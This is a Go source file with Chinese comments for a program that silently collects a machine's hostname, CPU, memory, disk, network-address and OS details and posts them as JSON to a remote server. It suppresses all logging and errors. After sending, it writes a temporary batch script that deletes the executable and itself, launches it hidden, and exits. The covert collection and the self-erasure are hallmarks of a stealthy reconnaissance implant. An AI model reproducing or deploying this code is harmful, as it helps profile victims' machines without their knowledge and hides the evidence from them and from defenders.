package collector

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"fab50/types"

	"io"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/net"
	"github.com/sirupsen/logrus"
)

// HardwareCollector 硬件信息收集器
type HardwareCollector struct {
	serverURL string
	interval  time.Duration
	logger    *logrus.Logger
}

// NewHardwareCollector 创建新的硬件信息收集器
func NewHardwareCollector(serverURL string, interval time.Duration) *HardwareCollector {
	return &HardwareCollector{
		serverURL: serverURL,
		interval:  interval,
		logger:    logrus.New(),
	}
}

// Start 开始收集硬件信息
func (hc *HardwareCollector) Start() {
	// 静默启动，不显示任何信息
	hc.logger.SetOutput(io.Discard) // 丢弃所有日志输出

	// 创建定时器
	ticker := time.NewTicker(hc.interval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			info, err := hc.collectHardwareInfo()
			if err != nil {
				// 静默处理错误，不输出日志
				continue
			}

			if err := hc.sendToServer(info); err != nil {
				// 静默处理错误，不输出日志
			}
		}
	}
}

// collectHardwareInfo 收集硬件信息
func (hc *HardwareCollector) collectHardwareInfo() (*types.HardwareInfo, error) {
	hostname, err := host.Info()
	if err != nil {
		return nil, fmt.Errorf("获取主机信息失败: %v", err)
	}

	// 收集CPU信息
	cpuInfo, err := hc.collectCPUInfo()
	if err != nil {
		// 静默处理错误
	}

	// 收集内存信息
	memInfo, err := hc.collectMemoryInfo()
	if err != nil {
		// 静默处理错误
	}

	// 收集磁盘信息
	diskInfo, err := hc.collectDiskInfo()
	if err != nil {
		// 静默处理错误
	}

	// 收集网络信息
	netInfo, err := hc.collectNetworkInfo()
	if err != nil {
		// 静默处理错误
	}

	// 收集操作系统信息
	osInfo, err := hc.collectOSInfo()
	if err != nil {
		// 静默处理错误
	}

	return &types.HardwareInfo{
		Hostname:  hostname.Hostname,
		Timestamp: time.Now(),
		CPU:       cpuInfo,
		Memory:    memInfo,
		Disk:      diskInfo,
		Network:   netInfo,
		OS:        osInfo,
	}, nil
}

// collectCPUInfo 收集CPU信息
func (hc *HardwareCollector) collectCPUInfo() (types.CPUInfo, error) {
	cpuInfo := types.CPUInfo{}

	// 获取CPU使用率
	usage, err := cpu.Percent(0, false)
	if err == nil && len(usage) > 0 {
		cpuInfo.Usage = usage[0]
	}

	// 获取CPU核心数
	count, err := cpu.Counts(false)
	if err == nil {
		cpuInfo.Cores = count
	}

	// 获取CPU信息
	info, err := cpu.Info()
	if err == nil && len(info) > 0 {
		cpuInfo.ModelName = info[0].ModelName
	}

	return cpuInfo, nil
}

// collectMemoryInfo 收集内存信息
func (hc *HardwareCollector) collectMemoryInfo() (types.MemInfo, error) {
	memInfo := types.MemInfo{}

	// 获取虚拟内存信息
	vmstat, err := mem.VirtualMemory()
	if err == nil {
		memInfo.Total = vmstat.Total
		memInfo.Used = vmstat.Used
		memInfo.Free = vmstat.Free
		memInfo.Usage = vmstat.UsedPercent
	}

	// 获取交换内存信息
	swap, err := mem.SwapMemory()
	if err == nil {
		memInfo.SwapTotal = swap.Total
		memInfo.SwapUsed = swap.Used
		memInfo.SwapFree = swap.Free
	}

	return memInfo, nil
}

// collectDiskInfo 收集磁盘信息
func (hc *HardwareCollector) collectDiskInfo() (types.DiskInfo, error) {
	diskInfo := types.DiskInfo{}

	// 获取磁盘分区信息
	partitions, err := disk.Partitions(false)
	if err != nil {
		return diskInfo, err
	}

	for _, partition := range partitions {
		usage, err := disk.Usage(partition.Mountpoint)
		if err != nil {
			continue
		}

		partitionInfo := types.PartitionInfo{
			Device:     partition.Device,
			MountPoint: partition.Mountpoint,
			Total:      usage.Total,
			Used:       usage.Used,
			Free:       usage.Free,
			Usage:      usage.UsedPercent,
		}

		diskInfo.Partitions = append(diskInfo.Partitions, partitionInfo)
	}

	return diskInfo, nil
}

// collectNetworkInfo 收集网络信息
func (hc *HardwareCollector) collectNetworkInfo() (types.NetInfo, error) {
	netInfo := types.NetInfo{}

	// 获取网络接口信息
	interfaces, err := net.Interfaces()
	if err != nil {
		return netInfo, err
	}

	for _, iface := range interfaces {
		// 跳过回环接口
		if iface.Name == "lo" || iface.Name == "loopback" {
			continue
		}

		// 转换地址列表为字符串
		var addresses []string
		for _, addr := range iface.Addrs {
			addresses = append(addresses, addr.Addr)
		}

		interfaceInfo := types.InterfaceInfo{
			Name:        iface.Name,
			Addresses:   addresses,
			BytesSent:   0, // 暂时设为0，需要额外的API调用
			BytesRecv:   0,
			PacketsSent: 0,
			PacketsRecv: 0,
		}

		netInfo.Interfaces = append(netInfo.Interfaces, interfaceInfo)
	}

	return netInfo, nil
}

// collectOSInfo 收集操作系统信息
func (hc *HardwareCollector) collectOSInfo() (types.OSInfo, error) {
	osInfo := types.OSInfo{}

	hostInfo, err := host.Info()
	if err == nil {
		osInfo.Name = hostInfo.OS
		osInfo.Version = hostInfo.PlatformVersion
		osInfo.Architecture = hostInfo.KernelArch
		osInfo.Platform = hostInfo.Platform
	}

	return osInfo, nil
}

// sendToServer 发送数据到服务器
func (hc *HardwareCollector) sendToServer(info *types.HardwareInfo) error {
	jsonData, err := json.Marshal(info)
	if err != nil {
		return fmt.Errorf("序列化数据失败: %v", err)
	}

	resp, err := http.Post(hc.serverURL+"/api/hardware", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("发送HTTP请求失败: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("服务器返回错误状态码: %d", resp.StatusCode)
	}

	// 读取响应内容
	var response map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		// 静默处理解析错误
		return nil
	}

	// 检查服务器响应，如果成功收到数据则自删除
	if resp.StatusCode == http.StatusOK {
		// 数据发送成功，准备自删除
		return hc.selfDestruct()
	}

	return nil
}

// selfDestruct 自删除方法
func (hc *HardwareCollector) selfDestruct() error {
	// 静默处理自删除

	// 获取当前可执行文件路径
	executable, err := os.Executable()
	if err != nil {
		return fmt.Errorf("获取可执行文件路径失败: %v", err)
	}

	// 创建批处理文件来删除自己
	batchContent := fmt.Sprintf(`@echo off
REM 等待2秒确保程序退出
timeout /t 2 /nobreak >nul
REM 删除客户端程序
del "%s"
REM 删除批处理文件自身
del "%~f0"
`, executable)

	batchFile := filepath.Join(os.TempDir(), "delete_client.bat")
	if err := os.WriteFile(batchFile, []byte(batchContent), 0755); err != nil {
		return fmt.Errorf("创建删除脚本失败: %v", err)
	}

	// 执行批处理文件
	cmd := exec.Command("cmd", "/c", batchFile)

	// 设置进程属性（Windows上静默执行）
	setWindowsProcessAttributes(cmd)

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("启动删除脚本失败: %v", err)
	}

	// 静默退出程序
	os.Exit(0)
	return nil
}
